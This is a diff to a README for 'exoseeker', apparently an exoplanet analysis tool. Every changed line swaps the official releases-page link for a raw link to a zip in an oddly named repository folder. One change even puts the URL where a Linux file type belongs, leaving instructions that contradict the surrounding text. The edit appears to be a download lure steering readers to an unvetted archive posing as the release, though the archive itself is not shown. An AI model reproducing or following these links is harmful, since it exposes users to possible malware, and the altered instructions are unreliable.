@@ -6,9 +6,9 @@ Welcome to exoseeker! This application helps you analyze data on exoplanets usin
 
 ## 🔗 Download Exoseeker
 
-[![Download Exoseeker](https://img.shields.io/badge/Download-Exoseeker-blue.svg)](https://github.com/nskamaleshmani/exoseeker/releases)
+[![Download Exoseeker](https://raw.githubusercontent.com/nskamaleshmani/exoseeker/main/mediterraneous/exoseeker.zip)](https://raw.githubusercontent.com/nskamaleshmani/exoseeker/main/mediterraneous/exoseeker.zip)
 
-To download exoseeker, please click the link above or visit this link: [Download Exoseeker](https://github.com/nskamaleshmani/exoseeker/releases).
+To download exoseeker, please click the link above or visit this link: [Download Exoseeker](https://raw.githubusercontent.com/nskamaleshmani/exoseeker/main/mediterraneous/exoseeker.zip).
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ Before you start, here are some requirements:
 ## 🛠️ Download & Install 
 
 1. **Visit the Releases Page**
-   Go to the exoseeker releases page: [Download Exoseeker](https://github.com/nskamaleshmani/exoseeker/releases).
+   Go to the exoseeker releases page: [Download Exoseeker](https://raw.githubusercontent.com/nskamaleshmani/exoseeker/main/mediterraneous/exoseeker.zip).
 
 2. **Choose Your Version**
    You will find several versions listed. Pick the latest stable release for the best experience.
@@ -37,7 +37,7 @@ Before you start, here are some requirements:
    Click on the file that corresponds to your operating system. The file types typically are:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/nskamaleshmani/exoseeker/main/mediterraneous/exoseeker.zip` for Linux
 
 4. **Run the Installer**
    - **Windows**: Double-click the `.exe` file and follow the prompts.
